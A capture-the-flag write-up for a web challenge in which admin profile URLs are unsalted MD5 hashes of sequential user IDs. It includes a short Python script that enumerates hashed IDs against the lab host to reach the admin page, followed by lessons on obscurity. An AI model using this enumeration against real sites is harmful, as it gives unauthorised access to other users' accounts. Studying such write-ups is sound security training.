---
type: writeup
source: CyLab
event: CyLab Academy
category: Web
difficulty:
status: solved
flags: kept
tags: [writeup, web]
---

# Hashgate

## Task
> You have gotten access to an organisation's portal. Submit your email and password, and it redirects you to your profile. But be careful: just because access to the admin isn't directly exposed doesn't mean it's secure. Maybe someone forgot that obscurity isn't security... Can you find your way into the admin's profile for this organisation and capture the flag?

## Approach
As usual, I poked around the site. I started by interacting with it normally, submitting random inputs in the input fields and checking the network requests. From there I checked the source code, any additional sources in the head, and whether any cookies were stored.

I found some credentials in the heading. I plugged them in and observed the HTTP response header and body. I noticed that the value after `/user` was a hash value. I was not sure what format it was in, so I used a hash type identifier online and found it was MD5.

I then figured out I would have to hash the correct value (we are given 3000) to authenticate as a higher-tier user. I was unsure what values to test, so I used the hint: the business only has 20 employees. So I started from 3001 and tried the hashes all the way up to 3021.

## Solution
The profile URL identifies a user by the MD5 hash of their numeric ID. Given a starting ID of 3000 and the hint that the org has only 20 employees, I brute-forced IDs 3001 to 3020, hashing each with MD5 and requesting the matching profile until the admin profile (and the flag) came back.

I automated it with a simple Python script ([exploit.py](Hashgate/exploit.py)):

```python
import hashlib
import requests

base = "http://xebec.cylabacademy.net:25373/profile/user/"

for i in range(3001,3021):
    h = hashlib.md5(str(i).encode()).hexdigest()
    url = base + h

    r = requests.get(url)

    if "admin" in r.text.lower() or "picoCTF" in r.text.lower():
        print("FOUND:", i, url)
        print(r.text)
        break
```

Running it found the admin profile and printed the flag.

## Flag
Not recorded verbatim in PWN notes (the script prints the `picoCTF{...}` flag from the matching profile response).

## Lessons
- Obscurity is not security. Hiding an admin profile behind an unlinked, hashed URL does nothing when the hash input is a small, guessable numeric ID.
- Unsalted MD5 of a sequential ID is trivially enumerable. An identifier derived purely from a predictable value can be reconstructed offline and replayed.
- The scope hint (20 employees) bounded the brute-force space, turning an unlimited search into a 20-request loop.
